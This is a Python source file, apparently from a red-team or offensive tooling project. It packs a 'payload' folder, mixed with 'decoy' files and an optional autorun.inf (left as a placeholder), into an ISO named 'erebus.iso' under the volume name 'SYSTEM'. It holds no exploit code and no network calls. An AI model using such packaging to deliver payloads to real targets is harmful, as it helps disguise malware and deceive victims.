import pathlib
import shutil
from pycdlib import PyCdlib

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
DEFAULT_ROOT = REPO_ROOT / "agent_code"

def build_iso(volume_id: str = "SYSTEM",
              enable_autorun: bool = True,
              build_path: pathlib.Path = None) -> pathlib.Path:
    """
    Generates an ISO container.
    
    :param volume_id: ISO volume name (appears in explorer).
    :type volume_id: str
    :param enable_autorun: Include autorun.inf for auto-execution hints.
    :type enable_autorun: bool
    :param build_path: The build path of the current build process.
    :type build_path: pathlib.Path
    :return: Returns Path to the generated ISO.
    :rtype: Path
    """   
    root_dir = build_path if build_path else DEFAULT_ROOT
    container_dir = root_dir / "container"
    payload_dir = root_dir / "payload"
    decoy_dir = root_dir / "decoys"

    try:
        for item in decoy_dir.rglob('*'):
            if any(part.startswith('.') for part in item.relative_to(decoy_dir).parts):
                continue

            if item.is_file():
                relative_path = item.relative_to(decoy_dir)
                target = payload_dir / relative_path
                target.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, target)
        
        if enable_autorun:
            autorun_content = f"""[autorun]
TODO
"""
            autorun_path = payload_dir / "autorun.inf"
            autorun_path.write_text(autorun_content)
        
        archive_path = container_dir / "iso" / "erebus.iso"
        archive_path.parent.mkdir(parents=True, exist_ok=True)

        iso = PyCdlib()
        iso.new(
            interchange_level=3,
            joliet=3,
            rock_ridge=None,
            vol_ident=volume_id
        )
        
        for item in payload_dir.rglob('*'):
            if any(part.startswith('.') for part in item.relative_to(payload_dir).parts):
                continue

            if item.is_file():
                relative_path = item.relative_to(payload_dir)
                iso_path = '/' + str(relative_path).replace('\\', '/')

                iso.add_file(
                    str(item), 
                    iso_path=iso_path.upper(), 
                    joliet_path=iso_path
                )
        
        iso.write(str(archive_path))
        iso.close()
        
        return archive_path

    except Exception as e:
        raise RuntimeError(f"ISO creation failed: {e}")
